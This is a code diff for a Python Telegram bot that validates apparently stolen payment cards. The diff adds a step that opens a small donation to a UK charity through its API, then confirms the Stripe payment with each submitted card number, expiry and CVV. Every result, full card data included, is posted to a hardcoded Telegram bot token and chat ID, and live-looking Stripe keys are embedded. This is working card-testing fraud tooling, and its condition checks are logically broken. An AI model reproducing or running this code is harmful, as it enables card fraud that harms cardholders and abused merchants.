@@ -21,7 +21,7 @@ def send_welcome ( message ) :
 	-------------------------
 	/cc  -------> 𝙂𝘼𝙏 1   <b>Ｓｔｒｉｐe　Ａｕｔｈ ✅ </b>
 	/stg -------> 𝙂𝘼𝙏 2 <b>Ｓｔｒｉｐe Ｃｈａｒｇｅ １＄ ✅</b>
-	/st  -------> 𝙂𝘼𝙏 3 <b>Ｓｔｒｉｐe Ｃｈａｒｇｅ 3 OFF ❌＄</b>
+	/st  -------> 𝙂𝘼𝙏 3 <b>Ｓｔｒｉｐe Ｃｈａｒｇｅ 3 ✅＄</b>
 	/sm  -------> 𝙂𝘼𝙏 4 <b>Ｓｔｒｉｐe Ｃｈａｒｇｅ 2,5＄✅</b>
 	-----------------------
 	/sk  -------> 𝘾𝙃𝙀𝘼𝙆 SK ✅
@@ -187,7 +187,7 @@ def snd_welcome ( message ) :
                         bot.reply_to ( message , msg )
 
                 elif 'Request rate limit exceeded.' or 'rate_limit' :
-                    bot.reply_to ( message , "CHEAK YOUR PROXY ---/ Retry " )
+                    bot.reply_to ( message , "<b> GAT OFF  ❌</b>" )
                 else :
                     us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
                         message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
@@ -250,76 +250,98 @@ def snd_welcome ( message ) :
             cvv = yy[3]
             now = datetime.now ()
             xx = '<i>' + cc + '|' + mth + '|' + ye + '|' + cvv + '</i>' + '\n'
+            urlp=''
             url = f'https://lookup.binlist.net/{cc}'
             r = requests.get ( url ).text
-            img = \
-            r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '"},' )[0].split ( '"emoji":"' )[1].split (
+            img =r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '"},' )[0].split ( '"emoji":"' )[1].split (
                 '","' )[0]
             shm = '|-𝙨𝙘𝙝𝙚𝙢𝙚: ' + r.split ( '"scheme":"' )[1].split ( '","' )[0] + '\n'
             tp = '|- 𝙏𝙔𝙋𝙀: ' + r.split ( '"type":"' )[1].split ( '","' )[0] + '\n'
-            lvel = '|- 𝙇𝙀𝙑𝙀𝙇: ' + r.split ( '"brand":"' )[1].split ( '","' )[0] + '\n'
-            cont = '|- 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: ' + \
-                   r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '","' )[0] + '\t' + img + '\n'
+            cont = '|- 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: ' +r.split ( '"country":{"' )[1].split ( ',"name":"' )[1].split ( '","' )[0] + '\t' + img + '\n'
             date = '|-𝘿𝘼𝙏𝙀: ' + str ( now ) + '\n'
             auther = '𝙗𝙤𝙩𝘽𝙮 : <a herf="https://t.me/n2k4n">𝙣𝙤𝙪𝙧𝙚𝙙𝙞𝙣𝙚𝙆𝙣</a>'
             x = str ( message.chat.id )
+            urlk='https://matchbot-production.thebiggive.org.uk/v1/donations'
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
+'Pragma': 'no - cache',
+'Accept': 'application/json, text/plain, */*',
+}
+            data=str('{"charityId":"0011r00002HobHtAAJ","charityName":"Good Shepherd Services","countryCode":"MA","currencyCode":"GBP","donationAmount":4,"donationMatched":false,"feeCoverAmount":0,"matchedAmount":0,"matchReservedAmount":0,"projectId":"a0569000029j6CSAAY","psp":"stripe","tipAmount":0.3}')
+            rk=requests.post(urlk,headers=headers,data=data).text
+            pi=rk.split('transactionId": "')[1].split('"')[0]
+            pik=rk.split('"clientSecret": "')[1].split('"')[0]
             if x in li :
-                url2 = 'https://api.stripe.com/v1/payment_intents/pi_3K6HFeHl6cVlrJKr1Xg9iDqz/confirm'
-                data = {
-                    'payment_method_data[type]' : 'card' ,
-                    'payment_method_data[billing_details][name]' : 'Nihf kn' ,
-                    'payment_method_data[card][number]' : cc ,
-                    'payment_method_data[card][cvc]' : cvv ,
-                    'payment_method_data[card][exp_month]' : mth ,
-                    'payment_method_data[card][exp_year]' : ye ,
-                    'payment_method_data[guid]' : 'ca62c621-8dfd-4344-aa27-f2564ccf36460a6ae6' ,
-                    'payment_method_data[muid]' : '49b2ccf6-2a11-4f95-82c0-112520e240fa1b4600' ,
-                    'payment_method_data[sid]' : 'b4016138-37ca-430c-952c-e055cef2ea961f1a46' ,
-                    'payment_method_data[payment_user_agent]' : 'stripe.js/c6f2aaa66; stripe-js-v3/c6f2aaa66' ,
-                    'payment_method_data[time_on_page]' : 48787 ,
-                    'expected_payment_method_type' : 'card' ,
-                    'use_stripe_sdk' : 'true' ,
-                    'webauthn_uvpa_available' : 'false' ,
-                    'spc_eligible' : 'false' ,
-                    'key' : 'pk_live_WGPbgfMspKkssN3TCXlbtQbF' ,
-                    'client_secret' : 'pi_3K6HFeHl6cVlrJKr1Xg9iDqz_secret_cCge71wK0Ht5ykXuUTS1BA0x0' ,
-                }
-                headers = {
-                    'user-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' ,
-                }
+                url2=f'https://api.stripe.com/v1/payment_intents/{pi}/confirm'
+                data={
+    'payment_method_data[type]':'card',
+    'payment_method_data[billing_details][name]':'Nihf kn',
+    'payment_method_data[card][number]':cc,
+    'payment_method_data[card][cvc]':cvv,
+    'payment_method_data[card][exp_month]':mth,
+    'payment_method_data[card][exp_year]':ye,
+    'payment_method_data[guid]': '5d292590-041b-4c7c-95b9-6564dff8c3f5b3860a',
+    'payment_method_data[muid]': 'f3053a7e-5b83-4f0a-9d60-015e61126fa5eb18e6',
+    'payment_method_data[sid]': '75292bf6-7798-4cbc-a03b-930c88e2724be439c0',
+    'payment_method_data[payment_user_agent]': 'stripe.js/c6f2aaa66; stripe-js-v3/c6f2aaa66',
+    'payment_method_data[time_on_page]': 48787,
+    'expected_payment_method_type': 'card',
+    'use_stripe_sdk': 'true',
+    'webauthn_uvpa_available': 'false',
+    'spc_eligible': 'false',
+    'key' : 'pk_live_51GxbdTKkGuKkxwBN1KsxsHMC8MrSeooSxBRETK6zoUYZSkKsjSLLryXE3vPIQm5jM6uV1Lsdvr9GoYB1dShkSELQ00xffCRBIi' ,
+    'client_secret' : pik ,
+}
+                headers={
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
+}
                 bot.reply_to ( message , "-----please W8 ----- " )
-                rr = requests.post ( url2 , data=data , headers=headers )
-                get = rr.text
-                msge = get.split ( '"message": "' )[1].split ( '",' )[0]
-                code = get.split ( 'code": "' )[1].split ( '",' )[0]
-                if 'declined' or 'bank_account_declined' or 'bank_account_exists' or 'bank_account_unusable' or 'card_decline_rate_limit_exceeded' or 'card_declined' or 'charge_already_captured' or 'charge_already_refunded' or 'expired_card' or 'incorrect_cvc' or 'incorrect_number' or 'invalid_expiry_month' or 'invalid_expiry_year' or 'invalid_number' or 'lock_timeout' or 'parameter_missing' or 'payment_method_bank_account_already_verified' or 'payment_method_bank_account_blocked' or 'payment_method_invalid_parameter' or 'payment_method_unsupported_type' in get :
-                    if 'Your card has insufficient funds.' in msge :
-                        us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
-                            message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
+                rr = requests.post(url2,data=data,headers=headers)
+                get=rr.text
+                msge=get.split('"message": "')[1].split('",')[0]
+                code=get.split('code": "')[1].split('",')[0]
+                if 'declined' or 'bank_account_declined' or 'bank_account_exists' or 'bank_account_unusable' or 'card_decline_rate_limit_exceeded'or 'card_declined' or 'charge_already_captured' or 'charge_already_refunded'or 'expired_card' or 'incorrect_cvc' or 'incorrect_number' or 'invalid_expiry_month' or 'invalid_expiry_year' or 'invalid_number' or 'lock_timeout' or 'parameter_missing' or 'payment_method_bank_account_already_verified' or 'payment_method_bank_account_blocked' or 'payment_method_invalid_parameter' or 'payment_method_unsupported_type' in get:
+                    msge=get.split('"message": "')[1].split('",')[0]
+                    code=get.split('code": "')[1].split('",')[0]
+                    if 'Your card has insufficient funds.' in get:
+                        us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' +'@'+ str (message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                         rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>\n'
-                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
-                        status = '|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>INSUFFICIENT FUNDS ✅</b>\n'
-                        msg = '-𝘾𝘾 : ' + xx + status + rps + rp + shm + tp + cont + us + date + auther
+                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
+                        status='|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>INSUFFICIENT FUNDS ✅</b>\n'
+                        msg= '-𝘾𝘾 : ' + xx +status+ rps + rp + shm + tp  + cont + us + date + auther
                         bot.reply_to ( message , msg )
                         snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
-                    else :
-                        us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
-                            message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
+                        requests.post(snd)
+                    elif 'invalid_cvc' in get:
+                        us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' +'@'+ str (message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
+                        rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>\n'
+                        rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝙀𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
+                        status='|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>CCN APPROVED ✅</b>\n'
+                        msg= '-𝘾𝘾 : ' + xx +status+ rps + rp + shm + tp  + cont + us + date + auther
+                        bot.reply_to ( message , msg )
+                    else:
+                        us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' +'@'+ str (message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
                         rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>❌\n'
                         rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
-                        msg = '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + lvel + cont + us + date + auther
-                        bot.reply_to ( message , msg )
-                else :
-                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' + '@' + str (
-                        message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
-                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + msge + '</b>✅\n'
-                    rp = '|- 𝙘𝙤𝙙𝙚: <b>' + code + '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
-                    msg = '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + cont + us + date + auther
+                        msg= '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp + cont + us + date + auther
+                        bot.reply_to ( message , msg )               
+                elif  'status": "succeeded"' or 'Successfully' or 'succeeded' in get:
+                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' +'@'+str (message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
+                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' + "Charged 3$"+ '</b>\n'
+                    rp = '|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>' + "APPROVED ✅"+ '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
+                    msg= '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp  + cont + us + date + auther
                     bot.reply_to ( message , msg )
                     snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
                     requests.post ( snd )
-            else :
-                y = " contact @N2k4n for allwed you!"
+                else:
+                    us = '|- 𝐜𝐡𝐞𝐚𝐤𝐞𝐝𝐁𝐲:  ' +'@'+str (message.from_user.username ) + '  [𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍]' + '\n'
+                    rps = '|- 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄 ᴍꜱɢ: <b>' +"Charged 3$"+ '</b>\n'
+                    rp = '|- 𝐒𝐓𝐀𝐓𝐔𝐒: <b>' + "APPROVED ✅"+ '</b>\n' + '|-𝙂𝘼𝙏:\t' + '<b>Stripe 3$</b>' + '\n'
+                    msg= '|- 𝘾𝘾: ' + xx + rps + rp + shm + tp  + cont + us + date + auther
+                    bot.reply_to ( message , msg )
+                    snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' + msg
+                    requests.post ( snd )     
+            else:
+                y = "<b>contact @N2k4n for allwed you!</b>"
                 bot.reply_to ( message , y )
     else :
         bot.reply_to ( message , '''𝙨𝙮𝙣𝙩𝙖𝙭 𝙚𝙧𝙧𝙤𝙧
